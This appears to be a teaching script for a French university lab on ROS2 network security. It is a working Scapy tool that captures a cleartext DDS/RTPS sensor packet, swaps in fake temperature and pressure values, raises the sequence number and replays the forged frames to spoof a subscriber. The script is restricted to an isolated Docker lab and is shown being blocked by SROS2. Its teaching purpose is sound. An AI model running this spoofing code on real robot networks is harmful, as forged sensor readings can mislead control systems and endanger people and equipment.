#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
inject_dds.py  --  Injection / usurpation (spoofing) de paquets DDS/RTPS
=========================================================================

TP Cybersecurite S7 - "Sniffing and Analysing a ROS2 Robot Network".
Partie A, etape 5 (demonstration de spoofing) et Partie B, etape 4 (bloque par SROS2).

ATTENTION / CADRE LEGAL
-----------------------
Script PEDAGOGIQUE a n'utiliser QUE sur le reseau Docker isole du TP (`ros2_lab`),
sur vos propres conteneurs. Ne jamais l'utiliser sur un reseau de production ni
sur des equipements dont vous n'etes pas proprietaire. (cf. consigne SECURITE du TP)

PRINCIPE
--------
DDS sans SROS2 n'offre NI authentification NI chiffrement. Un attaquant place sur
le segment reseau peut donc :
  1. capturer un paquet RTPS "DATA" legitime du topic /sensor_data ;
  2. en recopier l'entete (meme GUID d'ecrivain -> le subscriber le croit legitime) ;
  3. remplacer la valeur du capteur dans la charge utile (ex. 24.5 -> 99.9) ;
  4. incrementer le numero de sequence (SN) pour que le subscriber BEST_EFFORT
     accepte l'echantillon comme "nouveau" ;
  5. re-emettre la trame : le subscriber affiche la fausse mesure.

Sous SROS2 (Partie B), les paquets sont signes/chiffres : la trame forgee n'a pas
de signature valide et la couche securite DDS la rejette -> le subscriber ne la
recoit pas (menace STRIDE "S" = Spoofing, mitigee).

USAGE
-----
    python3 inject_dds.py --iface br-xxxx [--count 5] [--temp 99.9] [--pressure 6666.6]

Lancer depuis l'hote avec un conteneur en mode --net=host (voir run_inject.ps1),
pour voir le trafic unicast du bridge Docker.
"""
import argparse
import re
import sys
import time

from scapy.all import sniff, sendp, Ether, IP, UDP, Raw


def find_bridge_iface():
    """Devine l'interface bridge Docker (br-xxxx) si --iface n'est pas fourni."""
    try:
        import os
        for name in os.listdir('/sys/class/net'):
            if name.startswith('br-'):
                return name
    except Exception:
        pass
    return None


def is_sensor_data(pkt):
    return (UDP in pkt and pkt[UDP].dport >= 7400
            and Raw in pkt and b'temperature' in bytes(pkt[Raw]))


def patch_payload(raw, temp, pressure, sn_bump):
    """Remplace valeurs (longueur egale) et incremente le numero de sequence RTPS."""
    # 1) Fausses valeurs, MEME longueur que l'original (pas de recalcul CDR).
    fake_t = ('%.1f' % temp)
    fake_p = ('%.1f' % pressure)
    raw = re.sub(rb'temperature: \d{1,3}\.\d',
                 ('temperature: %s' % fake_t).encode(), raw, count=1)
    raw = re.sub(rb'pressure: \d{1,4}\.\d',
                 ('pressure: %s' % fake_p).encode(), raw, count=1)

    # 2) Incremente le numero de sequence du sous-message DATA.
    #    L'encapsulation CDR_LE "\x00\x01\x00\x00" precede la charge ; les 8 octets
    #    de SN (Hi+Low, little-endian) se trouvent juste avant.
    enc = raw.find(b'\x00\x01\x00\x00')
    if enc >= 12:
        sn_low_off = enc - 4
        sn_low = int.from_bytes(raw[sn_low_off:sn_low_off + 4], 'little')
        new_sn = sn_low + sn_bump
        raw = raw[:sn_low_off] + new_sn.to_bytes(4, 'little') + raw[sn_low_off + 4:]
        return raw, sn_low, new_sn
    return raw, None, None


def main():
    ap = argparse.ArgumentParser(description='Injection de paquets DDS/RTPS (TP, reseau isole)')
    ap.add_argument('--iface', default=find_bridge_iface(), help='interface (ex. br-xxxx)')
    ap.add_argument('--count', type=int, default=8, help='nombre de paquets forges a emettre')
    ap.add_argument('--sn-bump', type=int, default=500, dest='sn_bump',
                    help='avance du numero de sequence (doit rester devant le vrai writer)')
    ap.add_argument('--temp', type=float, default=99.9, help='fausse temperature')
    ap.add_argument('--pressure', type=float, default=6666.6, help='fausse pression')
    ap.add_argument('--timeout', type=int, default=20, help='attente max du paquet modele (s)')
    args = ap.parse_args()

    if not args.iface:
        print('[!] Interface introuvable, precisez --iface br-xxxx', file=sys.stderr)
        sys.exit(2)

    print('[*] Interface      : %s' % args.iface)
    print('[*] Capture d\'un paquet /sensor_data legitime (modele)...')
    pk = sniff(iface=args.iface, lfilter=is_sensor_data, count=1, timeout=args.timeout)
    if not pk:
        print('[X] Aucun paquet /sensor_data EN CLAIR capture.')
        print('    -> soit aucun flux, soit le trafic est CHIFFRE (SROS2 actif).')
        print('    L\'injection par recopie n\'a aucune charge lisible a reutiliser :')
        print('    c\'est exactement ce que SROS2 garantit (Partie B).')
        sys.exit(1)

    model = pk[0]
    raw = bytes(model[UDP].payload)
    orig = re.search(rb'temperature: [\d.]+, pressure: [\d.]+', raw)
    print('[*] Paquet modele  : %s -> %s  (SN visible, charge en clair)'
          % (model[IP].src, model[IP].dst))
    print('[*] Valeur reelle  : %s' % (orig.group().decode() if orig else '?'))

    print('[*] Forge de %d paquet(s) usurpe(s) (temperature=%.1f, pressure=%.1f)...'
          % (args.count, args.temp, args.pressure))
    sent = 0
    for i in range(args.count):
        new_raw, sn_old, sn_new = patch_payload(raw, args.temp, args.pressure,
                                                sn_bump=args.sn_bump + i)
        frame = model.copy()
        frame[Raw].load = new_raw
        # Laisse Scapy recalculer longueurs/checksums.
        del frame[IP].len, frame[IP].chksum, frame[UDP].len, frame[UDP].chksum
        sendp(frame, iface=args.iface, verbose=False)
        sent += 1
        if i == 0 and sn_old is not None:
            print('    SN %d -> %d (le subscriber BEST_EFFORT accepte un SN superieur)'
                  % (sn_old, sn_new))
        time.sleep(0.25)

    print('[+] %d paquet(s) usurpe(s) emis sur %s.' % (sent, args.iface))
    print('    Observez : (1) la trame injectee dans Wireshark ;')
    print('               (2) le subscriber afficher la FAUSSE valeur.')


if __name__ == '__main__':
    main()
